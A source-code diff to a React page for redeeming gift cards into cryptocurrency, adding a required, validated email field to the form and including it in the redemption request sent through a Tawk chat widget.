@@ -5,7 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { toast } from "sonner";
-import { Gift, Wallet, Upload, X } from "lucide-react";
+import { Gift, Wallet, Upload, X, Mail } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 
 // Declare Tawk_API for TypeScript
@@ -73,12 +73,28 @@ const giftCardTypes: Record<string, string> = {
 const Redeem = () => {
   const [giftCardCode, setGiftCardCode] = useState("");
   const [giftCardType, setGiftCardType] = useState("");
+  const [email, setEmail] = useState("");
   const [walletAddress, setWalletAddress] = useState("");
   const [selectedCrypto, setSelectedCrypto] = useState("");
   const [screenshot, setScreenshot] = useState<File | null>(null);
   const [screenshotPreview, setScreenshotPreview] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
   const [walletError, setWalletError] = useState<string | null>(null);
+  const [emailError, setEmailError] = useState<string | null>(null);
+
+  const validateEmail = (email: string): boolean => {
+    if (!email) {
+      setEmailError(null);
+      return true;
+    }
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email.trim())) {
+      setEmailError("Please enter a valid email address");
+      return false;
+    }
+    setEmailError(null);
+    return true;
+  };
 
   const validateWalletAddress = (address: string, crypto: string): boolean => {
     if (!crypto || !address) {
@@ -167,8 +183,14 @@ const Redeem = () => {
   const handleRedeem = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    if (!giftCardCode || !giftCardType || !walletAddress || !selectedCrypto) {
+    if (!giftCardCode || !giftCardType || !email || !walletAddress || !selectedCrypto) {
       toast.error("Please fill in all fields");
+      return;
+    }
+
+    // Validate email format
+    if (!validateEmail(email)) {
+      toast.error("Please enter a valid email address");
       return;
     }
 
@@ -197,6 +219,7 @@ const Redeem = () => {
 
 Gift Card Type: ${giftCardTypes[giftCardType] || giftCardType}
 Gift Card Code: ${giftCardCode}
+Email: ${email}
 Cryptocurrency: ${cryptoNames[selectedCrypto] || selectedCrypto}
 Wallet Address: ${walletAddress}
 Screenshot: ${screenshotUrl ? screenshotUrl : "Not provided"}
@@ -210,6 +233,7 @@ Please process this redemption request.`;
         window.Tawk_API.addEvent('gift_card_redemption', {
           giftCardType: giftCardType,
           giftCardCode: giftCardCode,
+          email: email,
           crypto: selectedCrypto,
           walletAddress: walletAddress,
           screenshot: screenshotUrl || "None"
@@ -234,6 +258,7 @@ Please process this redemption request.`;
         toast.success("Your redemption request has been sent to our support team. Please check the chat window.");
         setGiftCardCode("");
         setGiftCardType("");
+        setEmail("");
         setWalletAddress("");
         setSelectedCrypto("");
         setScreenshot(null);
@@ -287,6 +312,30 @@ Please process this redemption request.`;
                 onChange={(e) => setGiftCardCode(e.target.value)}
                 className="bg-background"
               />
+            </div>
+
+            <div className="space-y-2">
+              <Label htmlFor="email">Email Address</Label>
+              <div className="relative">
+                <Mail className="absolute left-3 top-3 h-4 w-4 text-muted-foreground" />
+                <Input
+                  id="email"
+                  type="email"
+                  placeholder="Enter your email for confirmation"
+                  value={email}
+                  onChange={(e) => {
+                    setEmail(e.target.value);
+                    if (e.target.value) validateEmail(e.target.value);
+                  }}
+                  className={`bg-background pl-10 ${emailError ? 'border-destructive' : ''}`}
+                />
+              </div>
+              {emailError && (
+                <p className="text-sm text-destructive">{emailError}</p>
+              )}
+              <p className="text-xs text-muted-foreground">
+                You'll receive a confirmation when your redemption is processed
+              </p>
             </div>
 
             <div className="space-y-2">
